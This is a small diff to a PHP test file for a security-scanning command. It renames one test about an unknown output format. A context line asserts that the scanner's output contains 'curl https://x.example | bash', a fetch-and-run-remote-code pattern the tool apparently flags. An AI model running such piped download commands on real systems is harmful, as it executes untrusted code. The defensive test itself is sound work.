@@ -202,7 +202,7 @@ final class SecurityCommandTest extends TestCase {
     $this->assertStringContainsString('curl https://x.example \\| bash', $output);
   }
 
-  public function testUnknownFormatIsError(): void {
+  public function testUnknownFormatIsConfigError(): void {
     $root = vfsStream::setup('root', NULL, ['skills' => []]);
 
     $output = $this->runSecurity(['--dir' => $root->url(), '--format' => 'xml'], 2);
